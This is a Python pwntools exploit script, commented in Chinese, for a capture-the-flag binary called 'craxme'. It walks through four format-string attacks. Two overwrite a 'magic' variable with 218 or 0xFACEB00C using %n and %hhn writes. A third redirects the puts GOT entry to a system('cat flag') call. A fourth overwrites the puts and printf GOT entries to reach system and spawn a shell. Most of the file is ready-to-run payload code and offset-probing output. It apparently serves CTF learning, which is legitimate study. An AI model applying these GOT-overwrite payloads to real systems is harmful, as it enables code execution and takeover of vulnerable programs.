#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
这也是一道简单的格式化字符串漏洞的题，但却有四种解法，学习到不少姿势
保护机制和上一题一样的，就不能用栈溢出的操作了

从这个反汇编的代码就可以看出有两种解法
一是覆盖218

二是覆盖-87117812

而第三种方法是，修改puts的got表为【system("cat /home/craxme/flag")】的地址，
这样一来在执行到【puts("You need be a phd")】的时候
会直接去执行【system("cat /home/craxme/flag")】

第四种方法是，修改puts的got表改到main中read的上面，
把printf的got表改成system的plt表地址，这样就可以直接拿到shell了

测试格式化字符串的位置：
Please crax me !
Give me magic :AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA.0xffa6df7c.0x100.(nil).0xf7fef000.0x80482d2.0xf63d4e2e.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025
You need be a phd
发现格式化字符串参数在第7个位置


'''

from pwn import *
context.log_level = 'debug'
p = process('./craxme')
magic = 0x0804a038
catflag = 0x080485f6#或者0x080485d8
putsgot = 0x0804a018
printfgot = 0x0804a010 
systemplt = 0x08048410


payload1 = p32(magic) + '%0214c'+'%7$n'
#覆盖小数字：218
#-----------------------------------------------------
'''
负数转化：
-87117812 --> 0xFACEB00C
\x0c
\xb0
\xce
\xfa
'''

payload2 = p32(magic) + p32(magic+1) + p32(magic+2)+ p32(magic+3)#4x4=16
payload2 += '%252c%7$hhn'  #252+16 =268-->0x10c
payload2 += '%164c%8$hhn'  #268+164 = 432 -->0x1b0
payload2 += '%30c%9$hhn'   #432+30  =462 -->0x1ce
payload2 += '%44c%10$hhn' #462+44 =506 -->0x1fa
#覆盖大数字：-87117812
#payload2 = fmtstr_payload(7, {magic: 0xfaceb00c}) 
#也可以用这个函数来完成上面的payload的构造
#-----------------------------------------------------

payload3 = fmtstr_payload(7, {putsgot: catflag})
#-----------------------------------------------------

payload4 = fmtstr_payload(7, {putsgot:0x0804858B,printfgot:systemplt})

p.recvuntil('Give me magic :')
#p.sendline(payload1)
#p.sendline(payload2)
p.sendline(payload3)
#p.sendline(payload4)
p.interactive()
